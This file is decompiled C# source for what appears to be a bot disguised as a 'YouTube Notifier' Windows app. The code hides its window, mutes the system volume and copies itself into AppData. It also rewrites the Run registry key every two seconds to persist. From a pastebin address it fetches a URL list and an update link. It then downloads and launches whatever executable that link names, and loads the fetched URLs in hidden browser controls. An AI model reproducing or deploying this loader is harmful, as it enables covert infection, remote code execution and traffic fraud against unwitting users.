#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using YoutubeFeedUpdater.Classes;
using YoutubeFeedUpdater.Classes.Tasks;
using ns0;

namespace YoutubeFeedUpdater;

public class FrmBot : Form
{
	[CompilerGenerated]
	private sealed class Class3
	{
		public string string_0;

		public void method_0(object sender, AsyncCompletedEventArgs e)
		{
			if (!e.Cancelled && e.Error == null)
			{
				smethod_0(bool_5: true);
				Process.Start(string_0);
				Process.GetCurrentProcess().Kill();
			}
		}
	}

	private const bool bool_0 = false;

	private const string string_0 = "http://pastebin.com/download.php?i=BH5gYgj3";

	private const int int_0 = 30000;

	private const int int_1 = 50000;

	private const int int_2 = 120000;

	private const int int_3 = 2;

	private const bool bool_1 = true;

	private const string string_1 = "YouTube Notifier";

	private const bool bool_2 = true;

	public const bool CLICK_ADS = false;

	public const int AD_ROTATION = 3;

	public const int WAIT_TIME = 15000;

	public const int CURRENT_VERSION = 5;

	public List<string> Urls = new List<string>();

	public List<string> VisitedUrls = new List<string>();

	private readonly TaskSystem[] taskSystem_0;

	private bool bool_3;

	private bool bool_4 = false;

	private Update update_0;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private TableLayoutPanel tableLayoutPanel1;

	private WebBrowser webBrowser3;

	private WebBrowser webBrowser2;

	private WebBrowser webBrowser1;

	public FrmBot()
	{
		InitializeComponent();
		Thread thread = new Thread(Loop);
		thread.Start();
		taskSystem_0 = new TaskSystem[2];
		taskSystem_0[0] = new TaskSystem(method_0, webBrowser1);
		taskSystem_0[1] = new TaskSystem(method_0, webBrowser2);
		for (int i = 0; i < taskSystem_0.Length; i++)
		{
			taskSystem_0[i].OnTasksFinished += method_1;
		}
		timer_0.set_Interval(120000);
		Control.set_CheckForIllegalCrossThreadCalls(false);
		timer_0_Tick(timer_0, new EventArgs());
		((Control)this).set_Text("Currerent version = " + 5);
		webBrowser1.set_ScriptErrorsSuppressed(true);
		Volume.Mute();
		smethod_0();
	}

	public void StartUp(string keyname, string apppath)
	{
		try
		{
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			bool flag = false;
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				if (text.Equals(keyname))
				{
					flag = true;
				}
			}
			if (!flag)
			{
				registryKey.SetValue(keyname, apppath);
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	public void Loop()
	{
		while (true)
		{
			_ = 1;
			StartUp("YouTube Notifier", Application.get_ExecutablePath());
			Thread.Sleep(2000);
		}
	}

	private void method_0(string string_2)
	{
		Debug.WriteLine(string_2);
	}

	private void method_1(TaskSystem taskSystem_1)
	{
		string text;
		lock (Urls)
		{
			lock (VisitedUrls)
			{
				if (!method_3())
				{
					VisitedUrls.Clear();
				}
				text = method_2();
				while (VisitedUrls.Contains(text) || string.IsNullOrEmpty(text))
				{
					text = method_2();
				}
				VisitedUrls.Add(text);
			}
		}
		if (text.StartsWith("//"))
		{
			text = text.Substring(2, text.Length - 2);
		}
		for (int i = 0; i < 2; i++)
		{
			taskSystem_1.AddTask(new Class2(text, taskSystem_1.HostWebBrowser));
			taskSystem_1.AddTask(new Class1(new Random().Next(30000, 50000)));
			taskSystem_1.AddTask(new Class0(taskSystem_1.HostWebBrowser));
			taskSystem_1.AddTask(new Clear(taskSystem_1.HostWebBrowser));
		}
	}

	private string method_2()
	{
		foreach (string url in Urls)
		{
			if (url.StartsWith("//") && !VisitedUrls.Contains(url))
			{
				return url;
			}
		}
		return Urls[new Random().Next(Urls.Count)];
	}

	private bool method_3()
	{
		foreach (string url in Urls)
		{
			if (!VisitedUrls.Contains(url))
			{
				return true;
			}
		}
		return false;
	}

	protected override void SetVisibleCore(bool value)
	{
		_ = 1;
		if (!((Control)this).get_IsHandleCreated() && value)
		{
			((Form)this).CreateHandle();
			value = false;
		}
		((Form)this).SetVisibleCore(value);
	}

	private void FrmBot_Load(object sender, EventArgs e)
	{
	}

	private static void smethod_0(bool bool_5 = false)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (bool_5)
			{
				registryKey.DeleteValue("YouTube Notifier", throwOnMissingValue: false);
				return;
			}
			_ = 0;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\YouTube Notifier.exe";
			if (!string.Equals(Application.get_ExecutablePath(), text, StringComparison.CurrentCultureIgnoreCase))
			{
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(Application.get_ExecutablePath(), text);
				registryKey.SetValue("YouTube Notifier", text);
				_ = 0;
				Process.Start(text);
				Process.GetCurrentProcess().Kill();
			}
		}
		catch (Exception ex)
		{
			Debug.Print(ex.ToString());
		}
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		if (!bool_4)
		{
			method_4();
			bool_4 = true;
		}
	}

	private void method_4()
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		if (update_0 == null)
		{
			webClient.DownloadStringCompleted += method_6;
			webClient.DownloadStringAsync(new Uri("http://pastebin.com/download.php?i=BH5gYgj3"));
			return;
		}
		Debug.WriteLine("Updating from " + update_0.Link);
		string string_0 = Path.GetTempFileName() + ".exe";
		WebClient webClient2 = new WebClient();
		webClient2.DownloadFileCompleted += delegate(object sender, AsyncCompletedEventArgs e)
		{
			if (!e.Cancelled && e.Error == null)
			{
				smethod_0(bool_5: true);
				Process.Start(string_0);
				Process.GetCurrentProcess().Kill();
			}
		};
		webClient2.DownloadFileAsync(new Uri(update_0.Link), string_0);
	}

	private void method_5(Update update_1)
	{
		if (update_1.Version > 5)
		{
			update_0 = update_1;
		}
		Debug.WriteLine($"Checking for updates: Current version: {5}, Server version: {update_1.Version}");
	}

	private void method_6(object sender, DownloadStringCompletedEventArgs e)
	{
		if (e.Cancelled || e.Error != null)
		{
			return;
		}
		string[] array = e.Result.Split(Environment.NewLine.ToCharArray());
		Update update = new Update();
		update.Link = array[2];
		update.Version = Convert.ToInt32(array[0]);
		Update update_ = update;
		method_5(update_);
		lock (Urls)
		{
			Urls.Clear();
			for (int i = 3; i < array.Length; i++)
			{
				string text = array[i];
				if (!string.IsNullOrEmpty(text))
				{
					Urls.Add(text);
				}
			}
		}
		if (!bool_3)
		{
			for (int i = 0; i < taskSystem_0.Length; i++)
			{
				method_1(taskSystem_0[i]);
			}
			bool_3 = true;
		}
		bool_4 = false;
	}

	private void FrmBot_FormClosing(object sender, FormClosingEventArgs e)
	{
		Application.Exit();
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Expected O, but got Unknown
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		//IL_03f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0402: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		tableLayoutPanel1 = new TableLayoutPanel();
		webBrowser3 = new WebBrowser();
		webBrowser2 = new WebBrowser();
		webBrowser1 = new WebBrowser();
		((Control)tableLayoutPanel1).SuspendLayout();
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(6000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		tableLayoutPanel1.set_ColumnCount(1);
		tableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel1.get_Controls().Add((Control)(object)webBrowser3, 0, 2);
		tableLayoutPanel1.get_Controls().Add((Control)(object)webBrowser2, 0, 1);
		tableLayoutPanel1.get_Controls().Add((Control)(object)webBrowser1, 0, 0);
		((Control)tableLayoutPanel1).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel1).set_Location(new Point(0, 0));
		((Control)tableLayoutPanel1).set_Name("tableLayoutPanel1");
		tableLayoutPanel1.set_RowCount(3);
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.44481f));
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.44482f));
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.11037f));
		((Control)tableLayoutPanel1).set_Size(new Size(557, 369));
		((Control)tableLayoutPanel1).set_TabIndex(0);
		webBrowser3.set_AllowWebBrowserDrop(false);
		((Control)webBrowser3).set_CausesValidation(false);
		((Control)webBrowser3).set_Dock((DockStyle)5);
		webBrowser3.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser3).set_Location(new Point(3, 249));
		((Control)webBrowser3).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser3).set_Name("webBrowser3");
		webBrowser3.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser3).set_Size(new Size(551, 117));
		((Control)webBrowser3).set_TabIndex(3);
		webBrowser3.set_WebBrowserShortcutsEnabled(false);
		webBrowser2.set_AllowWebBrowserDrop(false);
		((Control)webBrowser2).set_CausesValidation(false);
		((Control)webBrowser2).set_Dock((DockStyle)5);
		webBrowser2.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser2).set_Location(new Point(3, 126));
		((Control)webBrowser2).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser2).set_Name("webBrowser2");
		webBrowser2.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser2).set_Size(new Size(551, 117));
		((Control)webBrowser2).set_TabIndex(2);
		webBrowser2.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.set_AllowWebBrowserDrop(false);
		((Control)webBrowser1).set_CausesValidation(false);
		((Control)webBrowser1).set_Dock((DockStyle)5);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(3, 3));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser1).set_Size(new Size(551, 117));
		((Control)webBrowser1).set_TabIndex(1);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(557, 369));
		((Control)this).get_Controls().Add((Control)(object)tableLayoutPanel1);
		((Control)this).set_Name("FrmBot");
		((Control)this).set_Text("FrmBot");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FrmBot_FormClosing));
		((Form)this).add_Load((EventHandler)FrmBot_Load);
		((Control)tableLayoutPanel1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
